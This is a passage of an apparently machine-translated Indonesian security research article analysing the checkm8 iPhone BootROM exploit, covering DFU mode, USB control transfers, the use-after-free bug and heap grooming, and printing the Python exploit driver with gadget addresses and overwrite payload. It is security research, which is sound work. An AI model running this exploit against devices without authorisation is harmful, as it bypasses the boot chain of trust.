<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩🏼‍🌾 🙎 🍗 Analisis teknis eksploitasi checkm8 😄 👨‍💻 👩🏻‍🔧</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Dengan probabilitas tinggi Anda telah mendengar tentang exploit checkm8 sensasional, yang menggunakan kerentanan yang tidak dapat dipulihkan di BootRO...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Analisis teknis eksploitasi checkm8</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/471668/"><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/3l/k0/i2/3lk0i27tlko9sqankyec8rouqhw.png"></div><br><p> Dengan probabilitas tinggi Anda telah mendengar tentang exploit <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">checkm8</a> sensasional, yang menggunakan kerentanan yang tidak dapat dipulihkan di <code>BootROM</code> sebagian besar iDevices, termasuk <code>iPhone X</code>  Pada artikel ini, kami akan memberikan analisis teknis tentang eksploitasi dan melihat penyebab kerentanan.  Siapa pun yang tertarik - selamat datang di bawah luka! </p><a name="habracut"></a><br><p>  Anda dapat membaca artikel versi bahasa Inggris di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> . </p><br><h2 id="vvedenie">  Pendahuluan </h2><br><p>  Pertama, kami akan menjelaskan secara singkat proses boot iDevice dan mencari tahu di mana <code>BootROM</code> berada di dalamnya (bisa juga disebut <code>SecureROM</code> ) dan mengapa diperlukan.  Informasi terperinci tentang ini ada di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> .  Proses boot yang disederhanakan dapat direpresentasikan sebagai berikut: </p><br><p><img src="https://habrastorage.org/webt/kh/xi/tl/khxitlvaiov5lgx4kt45cq3qng4.png"></p><br><p>  <code>BootROM</code> adalah hal pertama yang dijalankan prosesor saat perangkat dihidupkan.  Tugas utama <code>BootROM</code> : </p><br><ul><li>  Inisialisasi platform (mengatur register platform yang diperlukan, menginisialisasi <code>CPU</code> , dll.) </li><li>  Verifikasi dan transfer kontrol ke tahap pemuatan berikutnya <br><ul><li>  <code>BootROM</code> mendukung parsing gambar <code>IMG3/IMG4</code> </li><li>  <code>BootROM</code> memiliki akses ke kunci <code>GID</code> untuk mendekripsi gambar </li><li>  Untuk memeriksa gambar, kunci publik <code>Apple</code> dibuat di dalam <code>BootROM</code> , dan ada fungsi yang diperlukan untuk bekerja dengan kriptografi </li></ul></li><li>  Memulihkan perangkat jika tidak memungkinkan untuk mengunduh lebih lanjut ( <code>Device Firmware Update</code> , <code>DFU</code> ) </li></ul><br><p>  <code>BootROM</code> sangat kecil, dan itu dapat disebut versi <code>iBoot</code> , karena mereka berbagi sebagian besar sistem dan kode pustaka.  Namun, tidak seperti <code>iBoot</code> , <code>BootROM</code> tidak dapat diperbarui.  Ini ditempatkan di memori hanya baca internal saat membuat perangkat.  <code>BootROM</code> adalah akar perangkat keras dari rantai kepercayaan boot.  Kerentanan di dalamnya dapat memungkinkan mendapatkan kontrol atas proses pengunduhan lebih lanjut dan mengeksekusi kode yang tidak ditandatangani pada perangkat. </p><br><p><img src="https://habrastorage.org/webt/9a/pr/po/9aprpovk-0wg8fs7uya3axvs86s.png"></p><br><h2 id="poyavlenie-checkm8">  Munculnya checkm8 </h2><br><p>  <code>checkm8</code> ditambahkan ke utilitas <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">ipwndfu oleh</a> penulisnya <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">axi0mX</a> pada 27 September 2019. Kemudian ia <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">mengumumkan</a> pembaruan di akun Twitter-nya, disertai dengan deskripsi eksploit dan informasi tambahan.  Anda dapat mengetahui dari utas bahwa kerentanan <code>use-after-free</code> dalam kode <code>USB</code> ditemukan oleh penulis selama proses patch-diffing <code>iBoot</code> untuk <code>iOS 12 beta</code> pada musim panas 2018.  Seperti disebutkan sebelumnya, <code>BootROM</code> dan <code>iBoot</code> memiliki banyak kode umum, termasuk kode untuk <code>USB</code> , itulah sebabnya kerentanan ini juga relevan untuk <code>BootROM</code> . </p><br><p>  Ini juga mengikuti dari kode exploit yang kerentanannya dieksploitasi di <code>DFU</code> .  Ini adalah mode di mana gambar yang ditandatangani dapat ditransfer ke perangkat melalui <code>USB</code> , yang selanjutnya akan diunduh.  Ini mungkin diperlukan, misalnya, untuk memulihkan perangkat jika pembaruan tidak berhasil. </p><br><p>  Pada hari yang sama, <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">littlelailo</a> melaporkan bahwa ia telah menemukan kerentanan ini pada bulan Maret dan menerbitkan deskripsinya dalam file <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">apollo.txt</a> .  Deskripsi tersebut sesuai dengan apa yang terjadi pada kode <code>checkm8</code> , tetapi tidak sepenuhnya menjelaskan detail dari exploit.  Oleh karena itu, kami memutuskan untuk menulis artikel ini dan menjelaskan semua detail operasi hingga pelaksanaan payload di <code>BootROM</code> inklusif. </p><br><p>  Kami melakukan analisis eksploitasi berdasarkan materi yang disebutkan sebelumnya, serta pada kode sumber <code>iBoot/SecureROM</code> bocor pada Februari 2018.  Kami juga menggunakan data yang diperoleh secara eksperimental pada perangkat pengujian kami - <code>iPhone 7</code> ( <code>CPID:8010</code> ).  Menggunakan <code>checkm8</code> kami menghapus dump <code>SecureRAM</code> dan <code>SecureRAM</code> dari itu, yang membantu kami dengan analisis. </p><br><h2 id="neobhodimye-znaniya-o-usb">  Pengetahuan USB esensial </h2><br><p>  Kerentanan yang terdeteksi ada dalam kode <code>USB</code> , sehingga diperlukan pengetahuan tentang antarmuka ini.  Anda dapat membaca spesifikasi lengkapnya di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> , tetapi cukup produktif.  Bahan yang sangat baik, yang lebih dari cukup untuk pemahaman lebih lanjut, adalah <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">USB dalam NutShell</a> .  Di sini kami hanya memberikan yang paling diperlukan. </p><br><p>  Ada berbagai jenis transfer data <code>USB</code> .  <code>DFU</code> hanya menggunakan <code>DFU</code> <code>Control Transfers</code> (Anda dapat membacanya di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> ).  Setiap transaksi dalam mode ini terdiri dari tiga tahap: </p><br><a name="setup_packet"></a><br><ul><li>  <code>Setup Stage</code> - pada tahap ini paket <code>SETUP</code> dikirim, yang terdiri dari bidang-bidang berikut: <br><ul><li>  <code>bmRequestType</code> - menjelaskan arah, jenis, dan penerima permintaan </li><li>  <code>bRequest</code> - menentukan permintaan yang diajukan </li><li>  <code>wValue</code> , <code>wIndex</code> - tergantung pada permintaan, mereka dapat diartikan berbeda </li><li>  <code>wLength</code> Panjang - panjang data yang diterima / dikirim dalam <code>Data Stage</code> </li></ul></li><li>  <code>Data Stage</code> - tahap opsional saat transfer data berlangsung.  Bergantung pada paket <code>SETUP</code> dari tahap sebelumnya, ini mungkin mengirim data dari host ke perangkat ( <code>OUT</code> ) atau sebaliknya ( <code>IN</code> ).  Data dikirim dalam porsi kecil (untuk <code>Apple DFU</code> , 0x40 byte). <br><ul><li>  Ketika tuan rumah ingin mentransfer kumpulan data berikutnya, ia mengirimkan token, setelah itu data itu sendiri dikirim. </li><li>  Ketika tuan rumah siap untuk menerima data dari perangkat, ia mengirimkan token, sebagai tanggapan terhadap mana perangkat mengirim data. </li></ul></li><li>  <code>Status Stage</code> - tahap akhir di mana status seluruh transaksi dilaporkan. <br><ul><li>  Untuk permintaan <code>OUT</code> , tuan rumah mengirim token <code>IN</code> , sebagai tanggapan terhadap mana perangkat harus mengirim paket data dengan panjang nol. </li><li>  Untuk permintaan <code>IN</code> , host mengirim token <code>OUT</code> dan paket data nol panjang. </li></ul></li></ul><br><p>  Kueri <code>OUT</code> dan <code>IN</code> ditunjukkan pada diagram di bawah ini.  Kami sengaja menghapus <code>ACK</code> , <code>NACK</code> dan paket jabat tangan lainnya dari skema deskripsi dan interaksi, karena mereka tidak memainkan peran khusus dalam eksploitasi itu sendiri. </p><br><p><img src="https://habrastorage.org/webt/lq/cm/-i/lqcm-itvvltjac1kkadebsszkkq.png"></p><br><h2 id="analiz-apollotxt">  Analisis apollo.txt </h2><br><p>  Kami memulai analisis dengan <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">memilah</a> kerentanan dari dokumen <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">apollo.txt</a> .  Ini menjelaskan algoritma mode <code>DFU</code> : </p><br><blockquote>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4</a> <br><ol><li>  Ketika usb mulai mendapatkan gambar lebih dari dfu, dfu mendaftarkan antarmuka untuk menangani semua perintah dan mengalokasikan buffer untuk input dan output </li><li>  jika Anda mengirim data ke dfu paket setup ditangani oleh kode utama yang kemudian memanggil kode antarmuka </li><li>  kode antarmuka memverifikasi bahwa wLength lebih pendek dari panjang buffer output input dan jika itu terjadi, pembaruan pointer dilewatkan sebagai argumen dengan pointer ke buffer output input </li><li>  lalu mengembalikan wLength yang merupakan panjang yang ingin diterima ke buffer </li><li>  kode utama usb kemudian memperbarui var global dengan panjang dan bersiap-siap untuk menerima paket data </li><li>  jika paket data diterima itu akan ditulis ke buffer output input melalui pointer yang disahkan sebagai argumen dan variabel global lainnya digunakan untuk melacak berapa banyak byte yang telah diterima </li><li>  jika semua data diterima, kode khusus dfu dipanggil lagi dan kemudian melanjutkan untuk menyalin isi buffer output input ke lokasi memori dari mana gambar tersebut kemudian di-boot </li><li>  setelah itu kode usb me-reset semua variabel dan melanjutkan untuk menangani paket-paket baru </li><li>  jika dfu keluar dari buffer output input dibebaskan dan jika parsing gambar gagal bootrom masukkan kembali dfu </li></ol><br></blockquote><p>  Pertama, kami membandingkan langkah-langkah yang dijelaskan dengan kode sumber <code>iBoot</code> .  Karena kita tidak dapat menggunakan fragmen kode sumber yang bocor dalam artikel, kami akan menunjukkan pseudocode yang diperoleh oleh <code>SecureROM</code> reverse engineering dari <code>iPhone 7</code> di <code>IDA</code> .  Anda dapat dengan mudah menemukan kode sumber <code>iBoot</code> dan menavigasi itu. </p><br><p>  Ketika mode <code>DFU</code> diinisialisasi, buffer <code>IO</code> dialokasikan dan antarmuka <code>USB</code> terdaftar untuk memproses permintaan ke <code>DFU</code> : </p><br><p><img src="https://habrastorage.org/webt/2r/il/hz/2rilhzhao9dq9561t0nou161xos.png"></p><br><p>  Ketika paket permintaan <code>SETUP</code> tiba di <code>DFU</code> , penangan antarmuka yang sesuai dipanggil.  Dalam hal eksekusi yang berhasil dari permintaan <code>OUT</code> (misalnya, ketika mentransfer gambar), pawang harus mengembalikan alamat buffer <code>IO</code> untuk transaksi dan ukuran data yang diharapkan akan diterima oleh pointer.  Dalam hal ini, alamat penyangga dan ukuran data yang diharapkan disimpan dalam variabel global. </p><br><p><img src="https://habrastorage.org/webt/ha/d7/7i/had77ibmhmmxpmnfmuwqgop96ps.png"></p><br><p>  Handler antarmuka untuk <code>DFU</code> ditunjukkan pada gambar di bawah.  Jika permintaan benar, maka alamat buffer <code>IO</code> dialokasikan pada tahap inisialisasi <code>DFU</code> dan panjang data yang diharapkan, yang diambil dari paket <code>SETUP</code> , dikembalikan oleh penunjuk. </p><br><p><img src="https://habrastorage.org/webt/v1/ws/cp/v1wscp8-tw9pwanbkcjal_9zpv4.png"></p><br><p>  Selama <code>Data Stage</code> setiap bagian data ditulis ke buffer <code>IO</code> , setelah itu alamat buffer <code>IO</code> digeser dan penghitung data yang diterima diperbarui.  Setelah menerima semua data yang diharapkan, penangan data antarmuka dipanggil dan keadaan transmisi global dihapus. </p><br><p><img src="https://habrastorage.org/webt/w7/-n/oo/w7-noo36ubqoc4wznkxjezxs_tu.png"></p><br><p>  Di penangan data <code>DFU</code> data yang diterima dipindahkan ke area memori tempat pengunduhan akan dilanjutkan.  Dilihat oleh kode sumber <code>iBoot</code> , area memori ini di <code>Apple</code> disebut <code>INSECURE_MEMORY</code> . </p><br><p><img src="https://habrastorage.org/webt/ep/sd/ro/epsdro1dycadjstreuvdpkejksa.png"></p><br><p>  Saat keluar <code>DFU</code> mode <code>DFU</code> , buffer <code>IO</code> dialokasikan sebelumnya akan dibebaskan.  Jika gambar berhasil diterima dalam mode <code>DFU</code> , itu akan diperiksa dan dimuat.  Jika, selama pengoperasian mode <code>DFU</code> , beberapa kesalahan terjadi atau tidak mungkin memuat gambar yang dihasilkan, <code>DFU</code> akan <code>DFU</code> ulang dan semuanya akan mulai dari awal lagi. </p><br><p>  Dalam algoritma yang dijelaskan, terletak kerentanan <code>use-after-free</code> .  Jika saat boot, kirim paket <code>SETUP</code> dan selesaikan transaksi dengan melewatkan <code>Data Stage</code> , keadaan global akan tetap diinisialisasi setelah memasukkan kembali siklus <code>DFU</code> , dan kami akan dapat menulis ke alamat buffer <code>IO</code> dialokasikan dalam iterasi <code>DFU</code> sebelumnya. </p><br><p>  Setelah berurusan dengan kerentanan <code>use-after-free</code> , kami bertanya-tanya: bagaimana saya bisa menimpa sesuatu selama iterasi <code>DFU</code> berikutnya?  Lagi pula, sebelum menginisialisasi ulang <code>DFU</code> semua sumber daya yang dialokasikan sebelumnya dibebaskan, dan lokasi memori dalam iterasi baru harus persis sama.  Ternyata ada kesalahan kebocoran memori yang menarik dan cukup indah yang memungkinkan mengeksploitasi kerentanan <code>use-after-free</code> , yang akan kita bahas nanti. </p><br><h2 id="analiz-checkm8">  Analisis Checkm8 </h2><br><p>  Kami melanjutkan langsung ke analisis exploit <code>checkm8</code> .  Untuk mempermudah, kami akan menganalisis versi eksploit yang dimodifikasi untuk <code>iPhone 7</code> , di mana kode yang terkait dengan platform lain telah dihapus, urutan dan jenis permintaan <code>USB</code> telah diubah tanpa kehilangan eksploit.  Juga dalam versi ini proses membangun payload dihapus, dapat ditemukan dalam file <code>checkm8.py</code> asli.  Memahami perbedaan antara versi untuk perangkat lain seharusnya tidak sulit. </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python from checkm8 import * def main(): print '*** checkm8 exploit by axi0mX ***' device = dfu.acquire_device(1800) start = time.time() print 'Found:', device.serial_number if 'PWND:[' in device.serial_number: print 'Device is already in pwned DFU Mode. Not executing exploit.' return payload, _ = exploit_config(device.serial_number) t8010_nop_gadget = 0x10000CC6C callback_chain = 0x1800B0800 t8010_overwrite = '\0' * 0x5c0 t8010_overwrite += struct.pack('&lt;32x2Q', t8010_nop_gadget, callback_chain) # heap feng-shui stall(device) leak(device) for i in range(6): no_leak(device) dfu.usb_reset(device) dfu.release_device(device) # set global state and restart usb device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001) libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0) dfu.release_device(device) time.sleep(0.5) # heap occupation device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50) for i in range(0, len(payload), 0x800): libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50) dfu.usb_reset(device) dfu.release_device(device) device = dfu.acquire_device() if 'PWND:[checkm8]' not in device.serial_number: print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.' sys.exit(1) print 'Device is now in pwned DFU Mode.' print '(%0.2f seconds)' % (time.time() - start) dfu.release_device(device) if __name__ == '__main__': main()</span></span></code> </pre> <br><p>  Pekerjaan <code>checkm8</code> dapat dibagi menjadi beberapa tahap: </p><br><ol><li>  Persiapan <code>heap feng-shui</code> ( <code>heap feng-shui</code> ) </li><li>  Alokasi dan pelepasan buffer <code>IO</code> tanpa membersihkan negara global </li><li>  Timpa <code>usb_device_io_request</code> di heap dengan <code>use-after-free</code> </li><li>  Penempatan Muatan </li><li>  Eksekusi <code>callback-chain</code> </li><li>  Eksekusi <code>shellcode</code> </li></ol><br><p>  Pertimbangkan masing-masing tahapan secara terperinci. </p><br><h2 id="1-podgotovka-kuchi-heap-feng-shui">  1. Persiapan tumpukan (heap feng-shui) </h2><br><p>  Tampaknya bagi kami bahwa ini adalah tahap yang paling menarik, dan kami memberikan perhatian khusus padanya. </p><br><pre> <code class="python hljs">stall(device) leak(device) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">6</span></span>): no_leak(device) dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p>  Langkah ini diperlukan untuk mencapai kondisi tumpukan yang nyaman untuk operasi <code>use-after-free</code> .  Untuk memulai, pertimbangkan <code>stall</code> panggilan, <code>leak</code> , <code>no_leak</code> : </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stall</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">0.00001</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">no_leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC1</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br><p>  <code>libusb1_no_error_ctrl_transfer</code> adalah pembungkus <code>device.ctrlTransfer</code> dengan mengabaikan pengecualian yang terjadi saat menjalankan permintaan.  <code>libusb1_async_ctrl_transfer</code> - pembungkus atas fungsi <code>libusb_submit_transfer</code> dari <code>libusb</code> untuk eksekusi query yang tidak sinkron. </p><br><p>  Kedua panggilan menerima parameter berikut: </p><br><ul><li>  Contoh perangkat </li><li>  Data untuk paket <code>SETUP</code> (uraiannya ada di <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">sini</a> ): <br><ul><li> <code>bmRequestType</code> </li> <li> <code>bRequest</code> </li> <li> <code>wValue</code> </li> <li> <code>wIndex</code> </li> </ul></li><li>  Ukuran Data ( <code>wLength</code> ) atau Data untuk <code>Data Stage</code> </li><li>  Permintaan Batas Waktu </li></ul><br><p>  Argumen <code>bmRequestType</code> , <code>bRequest</code> , <code>wValue</code> dan <code>wIndex</code> adalah umum untuk ketiga jenis kueri.  Artinya: </p><br><ul><li> <code>bmRequestType = 0x80</code> <br> <ul><li>  <code>0b1XXXXXXX</code> - arah <code>Data Stage</code> dari perangkat ke host (Device to Host) </li><li>  <code>0bX00XXXXX</code> - tipe permintaan standar </li><li>  <code>0bXXX00000</code> - penerima permintaan - perangkat </li></ul></li><li>  <code>bRequest = 6</code> - permintaan deskriptor ( <code>GET_DESCRIPTOR</code> ) </li><li> <code>wValue = 0x304</code> <br> <ul><li>  <code>wValueHigh = 0x3</code> - menentukan tipe deskriptor yang akan diterima - string ( <code>USB_DT_STRING</code> ) </li><li>  <code>wValueLow = 0x4</code> adalah indeks deskriptor string, 4 sesuai dengan nomor seri perangkat (dalam hal ini, string terlihat seperti <code>CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</code> ) </li></ul></li><li>  <code>wIndex = 0x40A</code> - pengidentifikasi bahasa string, nilainya tidak penting untuk operasi dan dapat diubah. </li></ul><br><p>  Untuk salah satu dari tiga permintaan ini, 0x30 byte dialokasikan pada heap untuk objek dari struktur berikut: </p><br><p><img src="https://habrastorage.org/webt/-e/ub/wb/-eubwbh-2fhsjb9bs36t0qom7be.png"></p><br><p>  Bidang yang paling menarik dari objek ini adalah <code>callback</code> dan <code>next</code> . </p><br><ul><li>  <code>callback</code> - pointer ke fungsi yang akan dipanggil ketika permintaan selesai. </li><li>  <code>next</code> - pointer ke objek berikutnya dengan tipe yang sama, diperlukan untuk mengantri permintaan. </li></ul><br><p>  Fitur utama dari <code>stall</code> panggilan adalah menggunakan eksekusi permintaan yang tidak sinkron dengan batas waktu minimum.  Karena ini, jika Anda beruntung, permintaan akan dibatalkan di tingkat OS dan akan tetap dalam antrian eksekusi, dan transaksi tidak akan selesai.  Pada saat yang sama, perangkat akan terus menerima semua paket <code>SETUP</code> masuk dan, jika perlu, menempatkannya dalam antrian eksekusi.  Kemudian, dengan menggunakan eksperimen dengan <code>USB</code> di <code>Arduino</code> kami dapat mengetahui bahwa agar operasi berhasil, tuan rumah harus mengirim paket <code>SETUP</code> dan token <code>IN</code> , setelah itu transaksi harus dibatalkan dengan batas waktu.  Secara skematis, transaksi yang tidak lengkap tersebut dapat direpresentasikan sebagai berikut: </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/sh/zq/ia/shzqiacghex3lk7jc9nhgoz3m7g.png"></div><br><p>  Sisa permintaan hanya berbeda panjang dan hanya satu.  Faktanya adalah bahwa untuk permintaan standar ada <code>callback</code> standar yang terlihat seperti ini: </p><br><p><img src="https://habrastorage.org/webt/cx/as/gn/cxasgnrqyant31ostgflo85zxro.png"></p><br><p>  Nilai <code>io_length</code> sama dengan minimum <code>wLength</code> dalam paket <code>SETUP</code> dari permintaan dan panjang asli dari deskriptor yang diminta.  Karena fakta bahwa deskriptor cukup panjang, kita dapat dengan tepat mengontrol nilai <code>io_length</code> dalam panjangnya.  Nilai <code>g_setup_request.wLength</code> sama dengan nilai <code>wLength</code> paket <code>SETUP</code> terakhir, dalam hal ini, <code>0xC1</code> . </p><br><p>  Dengan demikian, pada penyelesaian kueri yang dihasilkan menggunakan <code>stall</code> dan <code>leak</code> panggilan, kondisi dalam fungsi <code>callback</code> akhir terpenuhi, dan <code>usb_core_send_zlp()</code> dipanggil.  Panggilan ini hanya membuat <code>zero-length-packet</code> dan menambahkannya ke antrian eksekusi.  Ini diperlukan agar transaksi dapat diselesaikan dengan benar di <code>Status Stage</code> . </p><br><p>  Permintaan diakhiri dengan panggilan ke fungsi <code>usb_core_complete_endpoint_io</code> , yang pertama kali memanggil panggilan <code>callback</code> dan kemudian membebaskan memori permintaan.  Pada saat yang sama, penyelesaian permintaan dapat terjadi tidak hanya ketika seluruh transaksi benar-benar selesai, tetapi juga ketika <code>USB</code> diatur ulang.  Segera setelah sinyal reset <code>USB</code> diterima, antrian permintaan akan dilewati dan masing-masing akan selesai. </p><br><p>  Karena panggilan selektif ke <code>usb_core_send_zlp()</code> , melewati antrian permintaan dan kemudian melepaskannya, Anda dapat mencapai kontrol tumpukan yang cukup untuk operasi <code>use-after-free</code> .  Pertama, mari kita lihat siklus rilis itu sendiri: </p><br><p><img src="https://habrastorage.org/webt/ik/tn/ym/iktnymzi4lywmtf1xsmcfsgpyb4.png"></p><br><p>  Antrian permintaan dihapus terlebih dahulu, kemudian permintaan yang dibatalkan <code>usb_core_complete_endpoint_io</code> , dan mereka selesai dengan memanggil <code>usb_core_complete_endpoint_io</code> .  Pada saat yang sama, permintaan yang dipilih menggunakan <code>usb_core_send_zlp</code> ditempatkan di <code>ep-&gt;io_head</code> .  Setelah prosedur reset <code>USB</code> selesai, semua informasi tentang titik akhir akan diatur ulang, termasuk <code>io_head</code> dan <code>io_tail</code> , dan permintaan panjang nol akan tetap ada di heap.  Jadi, Anda bisa membuat bongkahan kecil di tengah sisa tumpukan.  Diagram di bawah ini menunjukkan bagaimana ini terjadi: </p><br><p><img src="https://habrastorage.org/webt/jl/rj/v5/jlrjv55cw23fehubgo7hsqmv68w.png"></p><br><p>  Tumpukan di <code>SecureROM</code> dirancang sedemikian rupa sehingga area memori baru dialokasikan dari potongan bebas yang sesuai dengan ukuran terkecil.  Dengan membuat potongan bebas kecil dengan metode yang dijelaskan di atas, Anda dapat memengaruhi alokasi memori selama inisialisasi <code>USB</code> dan alokasi <code>io_buffer</code> dan permintaan. </p><br><p>  Untuk pemahaman yang lebih baik, mari kita mencari tahu tumpukan yang terjadi selama inisialisasi <code>DFU</code> .  Dalam proses menganalisis kode sumber <code>iBoot</code> dan rekayasa balik <code>iBoot</code> <code>SecureROM</code> kami berhasil mendapatkan urutan berikut: </p><br><ul><li><ol><li>  Alokasi berbagai deskriptor string <br><ul><li>  1.1.  <code>Nonce</code> (ukuran <code>234</code> ) </li><li>  1.2.  <code>Manufacturer</code> ( <code>22</code> ) </li><li>  1.3.  <code>Product</code> ( <code>62</code> ) </li><li>  1.4.  <code>Serial Number</code> ( <code>198</code> ) </li><li>  1.5.  <code>Configuration string</code> ( <code>62</code> ) </li></ul></li></ol><br></li><li><ol><li>  Alokasi terkait dengan pembuatan tugas <code>USB</code> <br><ul><li>  2.1.  Struktur <code>0x3c0</code> ( <code>0x3c0</code> ) </li><li>  2.2.  Stack Task ( <code>0x1000</code> ) </li></ul></li></ol><br></li><li><ol><li>  <code>io_buffer</code> ( <code>0x800</code> ) </li></ol><br></li><li><ol><li>  Deskriptor konfigurasi <br><ul><li>  4.1.  <code>High-Speed</code> ( <code>25</code> ) </li><li>  4.2.  <code>Full-Speed</code> ( <code>25</code> ) </li></ul></li></ol><br></li></ul><br><p>  Lalu ada alokasi 